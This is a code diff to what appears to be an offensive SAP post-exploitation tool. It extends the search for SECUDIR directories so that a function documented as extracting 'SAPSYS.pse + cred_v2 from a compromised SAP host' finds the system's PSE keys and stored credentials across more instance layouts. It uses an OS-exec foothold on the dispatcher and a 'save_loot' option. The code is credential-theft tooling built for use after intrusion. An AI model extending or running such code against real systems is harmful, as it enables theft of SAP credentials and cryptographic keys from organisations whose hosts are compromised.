@@ -96,9 +96,15 @@ def _global_secudir(sid: str, sap_root: str = "/usr/sap",
             f"security{sep}data")
 
 
+def _expand_instance_nr(nr: str) -> list:
+    """Expand a two-digit instance number to all SAP directory patterns."""
+    return [f"D{nr}", f"DVEBMGS{nr}", f"ASCS{nr}", f"SCS{nr}"]
+
+
 def candidate_secudirs(sid: str, instance_dir: str,
                        os_type: str = "linux",
-                       sap_root: str = "") -> list:
+                       sap_root: str = "",
+                       extra_instance_nrs: list = None) -> list:
     """Ordered list of paths to try when locating SAPSYS.pse + cred_v2.
 
     Per-instance first (matches the dispatcher we have OS-exec on),
@@ -117,15 +123,10 @@ def candidate_secudirs(sid: str, instance_dir: str,
     all common patterns so the probe doesn't miss layouts like NPL's
     ``DVEBMGS42`` when the caller only knew instance number 42.
 
-    Args:
-        sid:          SAP system ID (case-insensitive)
-        instance_dir: Dispatcher's directory name on disk
-        os_type:      'linux' (default) or 'windows'
-        sap_root:     Explicit install root override.  When empty falls
-                      back to /usr/sap on Linux or C:\\usr\\sap on
-                      Windows.  Operators with non-standard layouts
-                      (e.g. P:\\usr\\sap on the operator's TWT) should
-                      supply the value discovered via DIR_LIBRARY.
+    ``extra_instance_nrs`` accepts additional two-digit instance
+    numbers (e.g. ["42"]) that are expanded alongside the primary
+    ``instance_dir``.  This lets callers pass ALL known instance
+    numbers from the node so every candidate is probed.
     """
     if os_type == "windows":
         root = sap_root or r"C:\usr\sap"
@@ -135,20 +136,25 @@ def candidate_secudirs(sid: str, instance_dir: str,
         sep = "/"
 
     import re
-    dirs = [instance_dir]
+    dirs = []
     m = re.match(r"^D(\d{2,})$", instance_dir)
     if m:
-        nr = m.group(1)
-        dirs = [
-            f"D{nr}",
-            f"DVEBMGS{nr}",
-            f"ASCS{nr}",
-            f"SCS{nr}",
-        ]
+        dirs.extend(_expand_instance_nr(m.group(1)))
+    else:
+        dirs.append(instance_dir)
 
+    for nr in (extra_instance_nrs or []):
+        for d in _expand_instance_nr(nr.zfill(2)):
+            if d not in dirs:
+                dirs.append(d)
+
+    seen = set()
     paths = []
     for d in dirs:
-        paths.append(_instance_secudir(sid, d, root, sep))
+        p = _instance_secudir(sid, d, root, sep)
+        if p not in seen:
+            paths.append(p)
+            seen.add(p)
     paths.append(_global_secudir(sid, root, sep))
     return paths
 
@@ -828,7 +834,8 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
                         save_loot: bool = True,
                         label: str = "",
                         os_type: Optional[str] = None,
-                        node=None) -> dict:
+                        node=None,
+                        extra_instance_nrs: list = None) -> dict:
     """Extract SAPSYS.pse + cred_v2 from a compromised SAP host.
 
     Args:
@@ -916,7 +923,8 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
     candidates = ([secudir] if secudir
                   else candidate_secudirs(sid, instance_dir,
                                             os_type=os_type,
-                                            sap_root=sap_root))
+                                            sap_root=sap_root,
+                                            extra_instance_nrs=extra_instance_nrs))
     print(f"{tag}: SECUDIR candidates: {candidates}")
 
     chosen_dir = ""
